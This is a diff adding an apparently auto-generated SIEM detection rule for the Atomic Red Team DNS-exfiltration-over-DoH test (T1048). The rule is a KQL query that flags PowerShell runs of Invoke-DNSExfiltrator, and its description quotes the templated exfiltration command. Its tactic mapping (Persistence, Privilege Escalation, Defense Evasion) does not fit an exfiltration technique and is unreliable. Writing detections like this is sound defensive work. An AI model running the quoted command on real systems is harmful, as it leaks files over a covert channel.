@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'DNSExfiltration (doh)' (GUID: c943d285-ada3-45ca-b3aa-7cd6500c6a48) of technique T1048 (Exfiltration Over Alternative Protocol). Test Description: DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator. Command/Steps: Import-Module \\\"#{ps_module}\\\"\nInvoke-DNSExfiltrator -i \\\"#{ps_module}\\\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}\n"
+from = "now-9m"
+rule_id = "305161bf-5e59-49df-aa48-d0559fccc020"
+language = "kql"
+name = "Atomic Test: T1048 - DNSExfiltration (doh)"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1048/T1048.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1048", "c943d285-ada3-45ca-b3aa-7cd6500c6a48", "windows",]
+type = "query"
+query = "(process.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\") OR process.parent.name : (\\\"powershell.exe\\\", \\\"pwsh.exe\\\", \\\"powershell_ise.exe\\\")) AND (powershell.script_block_text : \\\"*Import-Module*\\\" AND powershell.script_block_text : \\\"*Invoke-DNSExfiltrator*\\\" AND powershell.script_block_text : \\\"*target.example.com*\\\" OR (process.command_line : \\\"*Import-Module*\\\" AND process.command_line : \\\"*Invoke-DNSExfiltrator*\\\" AND process.command_line : \\\"*target.example.com*\\\"))"
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1048"
+name = "DNSExfiltration (doh)"
+reference = "https://attack.mitre.org/techniques/T1048"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1048"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1048"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1048"
+
+
